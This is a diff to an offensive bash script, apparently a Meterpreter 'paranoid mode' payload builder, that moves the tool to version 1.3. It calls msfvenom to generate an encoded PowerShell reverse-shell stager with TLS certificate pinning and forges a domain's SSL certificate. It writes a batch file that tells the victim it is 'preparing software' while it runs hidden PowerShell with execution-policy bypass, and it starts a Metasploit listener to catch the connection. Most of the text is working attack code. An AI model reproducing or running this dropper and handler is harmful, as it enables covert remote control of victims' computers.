@@ -9,7 +9,7 @@
 # In some scenarios, it pays to be paranoid. This also applies to generating
 # and handling Meterpreter sessions. This script implements the Meterpreter
 # paranoid mode (SSL/TLS) payload build, by creating a SSL/TLS Certificate
-# (manual OR impersonate) to use in connection (server + client) ..
+# (manual OR impersonate) to use it in connection (server <-> client) ..
 # "The SHA1 hash its used to validate the connetion betuiwn handler/payload"
 # ---
 #
@@ -26,7 +26,7 @@
 #
 # Tool variable declarations _______________
 #                                           |
-V3R="1.2"                                   # Tool version release
+V3R="1.3"                                   # Tool version release
 IPATH=`pwd`                                 # Store tool full install path
 ChEk_DB="OFF"                               # Rebuild msfdb database (postgresql)?
 DEFAULT_EXT="bat"                           # Default payload extension to use (bat | ps1 | txt)
@@ -150,7 +150,6 @@ if [ "$ChEk_DB" = "ON" ]; then
 fi
 
 
-
 #
 # grab Operative System distro to store IP addr
 # output = Ubuntu OR Kali OR Parrot OR BackBox
@@ -229,7 +228,7 @@ elif [ "$cHos" = "impersonate domain" ]; then
   xterm -T "MPM - IMPERSONATE CERTIFICATE" -geometry 121x26 -e "msfconsole -q -x 'use auxiliary/gather/impersonate_ssl; set RHOST $N4M3; exploit; sleep 3; exit -y'"
   echo "Impersonating $N4M3 RSA private key"
   sleep 1
-  echo "............................................................................................................................."
+  echo "........................................................................................................................................................................................................"
   sleep 1
   echo "Writing new private key to '$N4M3.key'"
   lOoT=`locate .msf4/loot`
@@ -277,21 +276,29 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
     msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -f psh-cmd -o paranoid-staged.$DEFAULT_EXT
 
       #
-      # head - paranoid-staged.bat
+      # head (shellcode) - paranoid-staged.bat
       #
       str0=`cat $IPATH/output/paranoid-staged.$DEFAULT_EXT | awk {'print $12'}`
       rm $IPATH/output/paranoid-staged.$DEFAULT_EXT > /dev/null 2>&1
-      # build trigger.bat template
       echo ${BlueF}[☠]${white} Building template ..${Reset};
       sleep 2
-      echo ":: template batch | Author: r00t-3xp10it" > $IPATH/output/template.bat
-      echo ":: ---" >> $IPATH/output/template.bat
-      echo "@echo off" >> $IPATH/output/template.bat
-      echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/template.bat
-      echo "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e $str0" >> $IPATH/output/template.bat
-      echo "exit" >> $IPATH/output/template.bat
-      mv -f template.bat paranoid-staged.$DEFAULT_EXT
-      sleep 2
+        #
+        # build template file ( bat )
+        #
+        if [ "$DEFAULT_EXT" = "bat" ]; then
+          echo ":: template batch | Author: r00t-3xp10it" > $IPATH/output/template
+          echo ":: ---" >> $IPATH/output/template
+          echo "@echo off" >> $IPATH/output/template
+          echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/template
+          echo "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -Exec Bypass -noni -enc $str0" >> $IPATH/output/template
+          echo "exit" >> $IPATH/output/template
+          mv -f template paranoid-staged.$DEFAULT_EXT
+        else
+          # build template ( ps1 | txt )
+          echo "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $str0" > $IPATH/output/template
+          mv -f template paranoid-staged.$DEFAULT_EXT
+        fi
+
 
   # 
   # Create the staged Paranoid Listener (multi-handler)
@@ -299,7 +306,7 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
   # A staged payload would need to set the HandlerSSLCert and
   # StagerVerifySSLCert true options to enable TLS pinning:
   echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
-  xterm -T "MPM - MULTI-HANDLER" -geometry 121x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; run -j'"
+  xterm -T "MPM - MULTI-HANDLER" -geometry 121x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; exploit'"
   echo ${BlueF}[☠]${white} Module excution finished ..${Reset};
   sleep 2
 
@@ -328,7 +335,7 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
   # A stageless payload would need to set the HandlerSSLCert and
   # StagerVerifySSLCert true options to enable TLS pinning:
   echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
-  xterm -T "MPM - MULTI-HANDLER" -geometry 121x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; run -j'"
+  xterm -T "MPM - MULTI-HANDLER" -geometry 121x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; exploit'"
   echo ${BlueF}[☠]${white} Module excution finished ..${Reset};
   sleep 2
 
